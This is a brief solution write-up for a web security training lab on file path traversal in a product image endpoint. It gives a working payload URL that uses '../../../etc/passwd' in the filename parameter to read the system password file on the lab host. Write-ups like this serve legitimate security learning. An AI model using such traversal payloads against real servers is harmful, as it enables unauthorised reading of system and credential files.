# Lab: File path traversal, simple case

>This lab contains a file path traversal vulnerability in the display of product images.

>To solve the lab, retrieve the contents of the /etc/passwd file.

### Solution
Right click the image of any product and open in a new tab

Notice that this path has a `filename` param, we can get the etc/passwd file with this simple path traversal payload:

`https://acdc1f051e88a915c0fd2b3100b70048.web-security-academy.net/image?filename=../../../etc/passwd`

Lab solved!